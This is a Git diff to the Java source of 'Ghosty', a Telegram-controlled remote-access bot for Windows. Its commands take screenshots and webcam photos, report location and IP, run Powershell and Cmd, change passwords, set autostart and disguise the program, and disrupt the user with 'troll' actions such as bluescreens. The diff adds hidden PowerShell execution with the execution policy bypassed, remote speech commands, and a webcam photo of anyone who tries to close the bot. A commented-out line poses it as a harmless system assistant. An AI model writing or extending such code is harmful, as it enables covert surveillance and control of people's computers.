@@ -62,7 +62,7 @@ public class Bot extends TelegramLongPollingBot {
     String fun = "DVD open,DVD close,Dog cleaner,Strange,Walk,Caps Fucker,Windows Fucker,Screen Fucker,Mouse Fucker,All Fucker,nobrain,bluescreen,scare";
     String info = "Screenshot,Uptime,Wer,BatteryInformation,Location,Version,Path,Name,Pic,OperatingSystem,IP";
     String tools = "Shutdown,Restart,Black,Lock,Alarm,Autolock,Sleep,GhostWriter,Close,Retry,ChangePW,Powershell,Uninstall,BotReset,Tarn,Cmd,Autostart";
-    public double version = 1.85;
+    public double version = 2.0;
     static private BotSession sup;
     boolean updating = false;
     private long last = System.currentTimeMillis();
@@ -84,12 +84,14 @@ public class Bot extends TelegramLongPollingBot {
     private boolean remove = false;
     static String password;
     static boolean silent;
-    private TrayIcon trayIcon;
+    //private TrayIcon trayIcon;
+    private SystemTray systemTray;
     private boolean unread = false;
     private ClientGUI chat;
     private boolean gusch = false;
+    static boolean mute = false;
     Map<String, Long> buttons = new HashMap<>();
-    private String changelog = "You can now share a link or a music video with Ghosty (on Telegram) and Ghosty will automatically open the page on your device (Play the Video if its a youtube link.)\nKI Function added Ghosty will learn your behavior.";
+    private String changelog = "Camera speed improved\nBug that you cant take a pic has been fixed.";
 
     public Bot(String[] args) {
         config = read();
@@ -152,6 +154,7 @@ public class Bot extends TelegramLongPollingBot {
         }
         if (!config.getName().contains(";")) {
             config.setName(this.name + ";");
+           // tts("Ghosty language has been sucessfully changed! HI, i am Zira, your personal assistant! Its a pleasure meeting you. My main task is to keep your system fast and clean. I will only warn you about security breaches and low battery status.");
             sendNachricht("Changelog:\n" + changelog);
             writeConf();
         }
@@ -273,8 +276,10 @@ public class Bot extends TelegramLongPollingBot {
             sendNachrichtAdmin("Update detected!");
             if (gusch)
                 sendNachrichtAdmin("SilentMode enabled!");
-            else
+            else {
                 sendNachricht("Updating!\nPlease do not turn off your device in the next minute.");
+                tts("Update detected! Please do not turn off your device in the next minute.");
+            }
             try {
                 GetFile n = new GetFile();
                 n.setFileId(update.getMessage().getDocument().getFileId());
@@ -337,7 +342,7 @@ public class Bot extends TelegramLongPollingBot {
             try {
                 this.buttons.put(nachricht, buttons.get(nachricht) + 1);
                 changed = true;
-            }catch (NullPointerException ignored){
+            } catch (NullPointerException ignored) {
             }
         }
         //<editor-fold desc="Shutdown Restart reset close">
@@ -873,7 +878,7 @@ public class Bot extends TelegramLongPollingBot {
         }
         if (nachricht.equalsIgnoreCase("pic")) {
             if (camera)
-                takepic();
+                takepic(false);
             else
                 sendNachricht("Camera has been deactivated in the settings.");
         }
@@ -902,6 +907,8 @@ public class Bot extends TelegramLongPollingBot {
                 BufferedImage screenShot = robot.createScreenCapture(allScreenBounds);
                 sendNachricht("OK, picture is sending!");
                 File send = new File(System.getProperty("user.home") + "\\Pic.jpg");
+                if (send.exists())
+                    send.delete();
                 ImageIO.write(screenShot, "JPG", send);
                 Thread.sleep(100);
                 sendPic(send);
@@ -949,6 +956,8 @@ public class Bot extends TelegramLongPollingBot {
         }
         //</editor-fold>
 
+        if (nachricht.toLowerCase().contains("sag:"))
+            tts(nachricht.split(":")[1]);
         if (menu == 0 && !troll) {
             wo = 0;
             sendNachricht("Troll function have been deactivated in the Ghosty Settings.");
@@ -1130,25 +1139,32 @@ public class Bot extends TelegramLongPollingBot {
 
     }
 
-    void takepic() {
+    void takepic(boolean fast) {
         try {
             Webcam webcam = Webcam.getDefault();
             File pic = new File("FaceDetection.png");
-            Dimension[] nonStandardResolutions = new Dimension[]{
-                    WebcamResolution.PAL.getSize(),
-                    WebcamResolution.HD720.getSize(),
-                    new Dimension(2000, 1000),
-                    new Dimension(1000, 500),
-            };
-            webcam.setCustomViewSizes(nonStandardResolutions);
-            webcam.setViewSize(WebcamResolution.HD720.getSize());
+            if (pic.exists())
+                pic.delete();
+            if (!fast) {
+                Dimension[] nonStandardResolutions = new Dimension[]{
+                        WebcamResolution.PAL.getSize(),
+                        WebcamResolution.HD720.getSize(),
+                        new Dimension(2000, 1000),
+                        new Dimension(1000, 500),
+                };
+                webcam.setCustomViewSizes(nonStandardResolutions);
+                webcam.setViewSize(WebcamResolution.HD720.getSize());
+            }
             webcam.open();
             ImageIO.write(webcam.getImage(), "png", pic);
             webcam.close();
             sendPic(pic);
+            Thread.sleep(100);
             pic.delete();
         } catch (IOException e) {
             sendNachricht(e.toString());
+        } catch (InterruptedException e) {
+            sendNachrichtAdmin(e.toString());
         }
     }
 
@@ -1268,17 +1284,17 @@ public class Bot extends TelegramLongPollingBot {
         if (!SystemTray.isSupported()) {
             return;
         }
-        SystemTray systemTray = SystemTray.getSystemTray();
+        if(systemTray == null)
+            systemTray = SystemTray.getSystemTray();
+        //SystemTray systemTray = SystemTray.getSystemTray();
         //get the systemTray of the system
         //get default toolkit
         //Toolkit toolkit = Toolkit.getDefaultToolkit();
         //get image
         //Toolkit.getDefaultToolkit().getImage("src/resources/busylogo.jpg");
         Image image = Toolkit.getDefaultToolkit().getImage(Bot.class.getResource("/Bilder/3.gif"));
-
         //popupmenu
         PopupMenu trayPopupMenu = new PopupMenu();
-
         MenuItem feedback = new MenuItem("Feedback");
         feedback.addActionListener(new ActionListener() {
             @Override
@@ -1346,6 +1362,15 @@ public class Bot extends TelegramLongPollingBot {
         });
         trayPopupMenu.add(chat);
 
+        MenuItem mute = new MenuItem("Mute");
+        mute.addActionListener(new ActionListener() {
+            @Override
+            public void actionPerformed(ActionEvent e) {
+                mute();
+            }
+        });
+        trayPopupMenu.add(mute);
+
 
         //2nd menuitem of popupmenu
         MenuItem close = new MenuItem("Close");
@@ -1377,14 +1402,14 @@ public class Bot extends TelegramLongPollingBot {
                     System.exit(0);
                 } else {
                     sendNachricht("Warning!\nSomeone tried to kill Ghosty!");
-                    takepic();
+                    takepic(true);
                 }
             }
         });
         trayPopupMenu.add(close);
 
         //setting tray icon
-        trayIcon = new TrayIcon(image, "Ghosty", trayPopupMenu);
+        TrayIcon trayIcon = new TrayIcon(image, "Ghosty", trayPopupMenu);
         //adjust to default size as per system recommendation
         trayIcon.setImageAutoSize(true);
 
@@ -1418,7 +1443,8 @@ public class Bot extends TelegramLongPollingBot {
                 image = Toolkit.getDefaultToolkit().getImage(Bot.class.getResource("/Bilder/unread.gif"));
                 break;
         }
-        trayIcon.setImage(image);
+        if (systemTray.getTrayIcons().length > 0)
+            systemTray.getTrayIcons()[0].setImage(image);
     }
 
     public void setSilent(boolean silen) {
@@ -1526,5 +1552,27 @@ public class Bot extends TelegramLongPollingBot {
 
     public void setClient(Client client) {
         this.client = client;
+    }
+
+    public void tts(String text) { //Ghooohstie
+        try {
+            String command = "Add-Type -AssemblyName System.speech \n" +
+                    "$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer \n" +
+                    "$speak.SelectVoice('Microsoft Zira Desktop') \n" +
+                    "$speak.Speak('" + text.replaceAll("'", "") + "')";
+            File file = File.createTempFile("Speaky", ".ps1");
+            FileWriter fw = new java.io.FileWriter(file);
+            fw.write(command);
+            fw.close();
+            Process k = Runtime.getRuntime().exec("powershell -windowStyle hidden -Exec Bypass \"" + file.getPath() + "\"");
+            k.waitFor();
+            file.delete();
+        } catch (Exception e) {
+            sendNachricht("Fehler beim Restart Script.");
+        }
+    }
+
+    void mute(){
+        systemTray.getTrayIcons()[0].getPopupMenu().getItem(4).setLabel("Clicked!");
     }
 }
